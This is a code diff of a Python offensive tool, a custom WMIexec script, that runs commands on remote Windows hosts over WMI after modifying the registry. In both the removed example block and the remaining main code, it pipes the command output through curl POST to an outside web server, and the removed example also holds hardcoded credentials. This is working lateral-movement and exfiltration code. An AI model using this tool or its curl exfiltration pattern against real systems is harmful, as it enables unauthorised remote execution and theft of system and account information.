@@ -63,12 +63,6 @@ class WMIAgent:
         else:
             print("[-] Failed to execute command.\n")
 
-# Example usage
-command_to_execute = "cmd /Q /c whoami /all | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- https://10.0.0.5:8080"
-username = "kleiton0x7e"
-password = "Passw0rd!"
-target_computer = "10.0.0.6"
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Custom WMIexec script created by @kleiton0x7e')
     parser.add_argument('-i', '--ip', action='store', required = True, help='The IP address/ hostname of the server')
@@ -90,8 +84,8 @@ if __name__ == "__main__":
         print(f"Failed to connect to the remote WMI namespace: {e}")
         exit(0)
 
+    #Initialize the agent
     agent = WMIAgent(c, args.ip, args.username, args.password, "cmd /Q /c " + args.command + " | curl -X POST -k -H 'Content-Type: text/plain' --data-binary @- " + webserver)
 
     agent.modify_registry()
     agent.execute_command_wmi()
-
